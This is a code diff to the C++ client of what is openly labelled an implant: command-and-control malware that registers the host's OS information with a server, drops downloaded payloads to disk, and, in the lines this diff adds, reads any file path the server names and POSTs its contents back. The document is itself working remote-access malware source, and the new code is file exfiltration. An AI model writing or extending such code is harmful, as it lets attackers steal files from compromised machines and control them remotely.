@@ -51,13 +51,29 @@ namespace client {
         std::ofstream out_file(path + "/" + client::DOWNLOAD_FILE_NAME, std::ios::out);
 
         if (!out_file) {
-            std::cout << "[IMPLANT] File not created";
+            std::cout << "[IMPLANT] File not created" << std::endl;
             return false;
         }
         else {
             copy(payload.begin(), payload.end(), std::ostreambuf_iterator<char>(out_file));
             return true;
         }
+    }
+
+    std::vector<unsigned char> uploadFile(std::string path) {
+        std::ifstream in_file(path);
+
+        if (!in_file) {
+            std::cout << "[IMPLANT] File could not be opened for reading" << std::endl;
+            return std::vector<unsigned char>();
+        }
+        else {
+            std::stringstream in_stream;
+            in_stream << in_file.rdbuf();
+            const std::string& in_str = in_stream.str();
+            return std::vector<unsigned char>(in_str.begin(), in_str.end());
+        }
+
     }
 }
 
@@ -113,6 +129,8 @@ bool ClientPP::osInfo (int dwRandomTimeSleep, ClientPP * c) {
         std::vector<unsigned char> response_vector = ClientPP::performHTTPRequest(c->dylib, "POST", std::vector<unsigned char>(os_info.begin(), os_info.end()), registration);
 
         completed_discovery = true;
+        
+        std::this_thread::sleep_for(std::chrono::milliseconds(dwRandomTimeSleep));
     }
 
     return completed_discovery;
@@ -159,6 +177,16 @@ void ClientPP::runClient(int dwRandomTimeSleep, ClientPP * c, void * dylib) {
         else if (dwCommand == 0x72) {
             // upload file
             std::cout << "[IMPLANT] Received upload file instruction" << std::endl;
+            std::vector<unsigned char> path = Communication::getPayload(packet);
+            std::string path_str(path.begin(), path.end());
+            std::vector<unsigned char> upload_file = client::uploadFile(path_str);
+            if (upload_file.size() == 0) {
+                std::cout << "[IMPLANT] Read file for upload failed" << std::endl;
+            }
+            else {
+                unsigned char execute_instruction[] = {0x72, 0x00, 0x00, 0x00};
+                std::vector<unsigned char> command_response = ClientPP::performHTTPRequest(c->dylib, "POST", upload_file, execute_instruction);
+            }
         }
         else if (dwCommand == 0x23 || dwCommand == 0x3C ) {
             // download file
@@ -166,7 +194,7 @@ void ClientPP::runClient(int dwRandomTimeSleep, ClientPP * c, void * dylib) {
             std::vector<unsigned char> fileBytes = Communication::getPayload(packet);
             bool success = client::downloadFile(fileBytes, c->pathProcess);
             if (!success) {
-                std::cout << "[IMPLANT] Download failed" << std::endl;
+                std::cout << "[IMPLANT] Write file for download failed" << std::endl;
             }
         }
         else if (dwCommand == 0xAC) {
